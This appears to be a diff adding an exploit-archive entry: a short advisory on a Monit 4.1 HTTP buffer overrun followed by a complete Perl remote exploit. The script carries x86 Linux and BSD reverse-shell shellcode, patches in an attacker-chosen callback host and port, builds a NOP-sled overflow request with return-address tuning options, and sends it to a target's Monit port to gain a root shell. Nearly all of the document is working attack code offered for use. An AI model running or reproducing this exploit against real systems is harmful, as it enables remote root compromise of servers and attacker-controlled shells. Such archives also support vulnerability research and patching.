@@ -1,0 +1,232 @@
+source: http://www.securityfocus.com/bid/9099/info
+
+A buffer overrun vulnerability has been discovered in Monit 4.1 and earlier that could be exploited remotely to gain root privileges. The problem occurs due to insufficient bounds checking when handling overly long HTTP requests. As a result, it may be possible for a remote attacker to corrupt sensitive process data in such a way that the execution flow of Monit can be controlled.
+
+Successful exploitation of this condition could potentially allow for the execution of arbitrary code with root privileges. 
+
+// Michel, http://www.cycom.se
+
+#!/usr/bin/perl
+#
+# Monit 4.1 (possibly earlier too) remote shell exploit (HTTP)
+# (C) 2004 by Shadowinteger <shadowinteger@sentinix.org>
+#
+# Verbatim copying, distribution and/or modification of this
+# code is permitted without restriction.
+#
+# THIS SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY
+# KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE
+# WARRANTIES  OF  MERCHANTABILITY,  FITNESS FOR A PARTICULAR
+# PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS
+# OR  COPYRIGHT  HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR
+# OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR
+# OTHERWISE,  ARISING FROM, OUT OF OR IN CONNECTION WITH THE
+# SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
+#
+# You may have to install Math::XOR for this to run, e.g.:
+# $ perl -MCPAN -e "install Math::XOR"
+#
+# Acknowledgments: Sabu, Nullbyte
+#
+
+use POSIX;
+use Getopt::Std;
+use IO::Socket::INET;
+use Math::XOR;
+use strict;
+
+sub usage {
+    print "usage: sploit [-a 0xbf7ff9e4] [-o 250] target_host [port]\n" .
+          "  -a address   ret address to make eip\n" .
+          "  -o offset    offset to subtract from address before injecting it\n" .
+          "  -c hostname  choose hostname to have the shellcode connect back to, default\n" .
+          "               is localhost\n" .
+          "  -p port      choose port to have the shellcode connect back to, default is\n" .
+          "               31337.\n" .
+          "  -B           use x86 *BSD shellcode instead of x86 Linux\n" .
+          "The default address is 0xbf7ff9e4 and the default offset to subtract from that\n" .
+          "address is 250, this works under Slackware 8.1 with default ./configure\n" .
+          "compilation options. You may have to do some research for your system, gdb is\n" .
+          "your friend, e.g. \"gdb process pid_of_monit_httpd\".\n";
+    exit 1;
+}
+
+# pre_shellcode was added to make sure the stack doesn't write into our
+# shellcode
+my $pre_shellcode = "\x83\xC4\x40";  # add esp, byte 0x40
+
+my $linux_shellcode = # shadowinteger's reverse shellcode (sishell, x86 linux)
+"\xeb\x74\x5d\x6a\x06\x6a\x01\x6a\x02\x8d\x1c\x24\x89\xd9\x31\xdb" .
+"\xb3\x01\x31\xc0\xb0\x66\xcd\x80\x89\xc7\x83\xec\x08\x31\xc9\xc6" .
+"\x04\x24\x02\x88\x4c\x24\x01\xb8\x80\xff\xff\xfe\x35\xff\xff\xff" .
+"\xff\x66\xc7\x44\x24\x02\x7a\x69\x89\x44\x24\x04\x8d\x04\x24\x83" .
+"\xec\x10\x89\x3c\x24\x89\x44\x24\x04\x31\xc0\xb0\x10\x89\x44\x24" .
+"\x08\x31\xc0\xb0\x66\x31\xdb\xb3\x03\x8d\x14\x24\x89\xd1\xcd\x80" .
+"\x85\xc0\x78\x3c\x31\xc9\x31\xc0\xb0\x3f\x89\xfb\xcd\x80\x41\x80" .
+"\xf9\x02\x77\x04\xeb\xf0\xeb\x2f\x83\xec\x10\x8d\x44\x24\x08\x89" .
+"\x04\x24\x31\xdb\x89\x5c\x24\x04\x89\x5c\x24\x08\x88\x5d\x07\x89" .
+"\xeb\x8d\x14\x24\x89\xd1\x31\xd2\x31\xc0\xb0\x0e\x2c\x03\xcd\x80" .
+"\x31\xc0\x89\xc3\x40\xcd\x80\xe8\x56\xff\xff\xff\x2f\x62\x69\x6e" .
+"\x2f\x73\x68\x24";
+my $lin_IP_OFFSET = 40;
+my $lin_PORT_OFFSET = 54;
+my $lin_XOR = 0xffffffff;   # number to xor the ip address with
+
+
+my $bsd_shellcode = # shadowinteger's reverse shellcode (sishell, x86 bsd)
+"\xeb\x55\x5d\x6a\x06\x6a\x01\x6a\x02\x31\xc0\xb0\x61\x50\xcd\x80" .
+"\x89\xc7\x83\xec\x08\x31\xc9\xc6\x04\x24\x02\x88\x4c\x24\x01\xb8" .
+"\x80\xff\xff\xfe\x35\xff\xff\xff\xff\x66\xc7\x44\x24\x02\x7a\x69" .
+"\x89\x44\x24\x04\x8d\x04\x24\x6a\x10\x50\x57\x31\xc0\xb0\x62\x50" .
+"\xcd\x80\x72\x3b\x31\xc9\x51\x57\x31\xc0\xb0\x5a\x50\xcd\x80\x41" .
+"\x80\xf9\x02\x77\x04\xeb\xef\xeb\x2e\x83\xec\x10\x8d\x44\x24\x08" .
+"\x89\x04\x24\x31\xdb\x89\x5c\x24\x04\x89\x5c\x24\x08\x8d\x14\x24" .
+"\x89\xd1\x53\x51\x88\x5d\x07\x55\x31\xc0\xb0\x3b\x50\xcd\x80\x31" .
+"\xc0\x50\xfe\xc0\x50\xcd\x80\xe8\x76\xff\xff\xff\x2f\x62\x69\x6e" .
+"\x2f\x73\x68\x24";
+my $bsd_IP_OFFSET = 32;
+my $bsd_PORT_OFFSET = 46;
+my $bsd_XOR = 0xffffffff;
+
+
+# just define these here, since we're "strict"
+my $shellcode;
+my $IP_OFFSET;
+my $PORT_OFFSET;
+my $XOR;
+
+
+# set up defaults
+
+my $offset = 250; # offset to back-track (subtract) from $address
+my $address = 0xbf7ff9e4;
+
+my $target = "localhost";
+my $port = 2812;
+
+my $callback_host = "localhost";
+my $callback_port = pack('n', 31337);
+
+
+# handle options
+
+my %options = ();
+getopts("a:o:c:p:Bh", \%options);
+
+if ( defined $options{h} ) {
+    usage();
+}
+if ( ! $ARGV[0]) {
+    usage();
+} else {
+    if ( length($ARGV[0]) > 0 ) {
+        $target = $ARGV[0];
+    }
+}
+if ( $ARGV[1]) {
+    $port = $ARGV[1];
+}
+
+# if -B option is present, define $bsd
+my $bsd = "yes" if defined $options{B};
+
+if ( defined $options{a} ) {
+    $address = hex($options{a});
+}
+if ( defined $options{o} ) {
+    $offset = $options{o};
+}
+if ( defined $options{c} ) {
+    if ( length($options{c}) > 0 ) {
+        $callback_host = $options{c};
+    }
+}
+if ( defined $options{p} ) {
+    $callback_port = pack('n', $options{p});
+}
+
+
+# set up shellcode pointers... linux or bsd?
+
+if ( defined $bsd ) {
+    $shellcode = $bsd_shellcode;
+    $IP_OFFSET = $bsd_IP_OFFSET;
+    $PORT_OFFSET = $bsd_PORT_OFFSET;
+    $XOR = $bsd_XOR;
+} else {
+    $shellcode = $linux_shellcode;
+    $IP_OFFSET = $lin_IP_OFFSET;
+    $PORT_OFFSET = $lin_PORT_OFFSET;
+    $XOR = $lin_XOR;
+}
+
+
+# resolve hostname
+my $callback_ip = gethostbyname($callback_host);
+
+# insert resolved connect back address into shellcode
+substr($shellcode, $IP_OFFSET, 4, xor_buf($callback_ip, pack('l',$XOR)));
+
+# insert port into shellcode (short network order)
+substr($shellcode, $PORT_OFFSET, 2, $callback_port);
+
+# decode (un-xor) IP address in shellcode and print it to stdout
+# don't uncomment, it's just an example
+# print xor_buf(substr($shellcode, $IP_OFFSET, 4), pack('l',$XOR));
+
+
+# calculate address and make it binary
+
+my $eip = $address - $offset;
+my $bin_eip = pack('l', $eip);
+
+# cruft is our parsed payload:
+# [ NOPNOPNOPNOP ] [ PRE ] [ SHELLCODE ] [ ADDR ] [ ADDR ]
+#        ^
+#  ideal jump address
+#
+my $cruft = "\x90" x (256 - length($pre_shellcode . $shellcode)) .
+            $pre_shellcode . $shellcode . $bin_eip x 2;
+
+# build HTTP request, there's nothing more to it than to add a double linefeed
+my $request = $cruft . "\n\n";
+
+#
+# print banner and get started
+#
+print '-?? Monit 4.1 remote shell exploit (HTTP)'."\n";
+print '??- (C) 2004 Shadowinteger <shadowinteger@sentinix.org'."\n";
+
+if ( defined $bsd ) {
+    print "[i] using x86 *BSD shellcode (sishell)\n";
+} else {
+    print "[i] using x86 Linux shellcode (sishell)\n";
+}
+
+printf("[i] using ret address: 0x%x\n", $eip);
+
+print "[i] shellcode will connect to " . inet_ntoa($callback_ip) .
+      ", port " . unpack('n', $callback_port) . "\n";
+
+print "[i] attacking " . $target . ", port " . $port . "\n";
+print "[+] connecting to target...\n";
+
+my $socket = 0;
+$socket = IO::Socket::INET -> new( PeerAddr => $target,
+                                   PeerPort => $port,
+                                   Proto    => "tcp" );
+if (!defined($socket)) {
+    print "[?] no connection!\n";
+    exit 1;
+}
+
+print "[i] connection established\n";
+
+print "[+] injecting shellcode...\n";
+print $socket $request;
+sleep(3);
+print "[i] done\n";
+close $socket;
+exit 0;
+## EOF
+
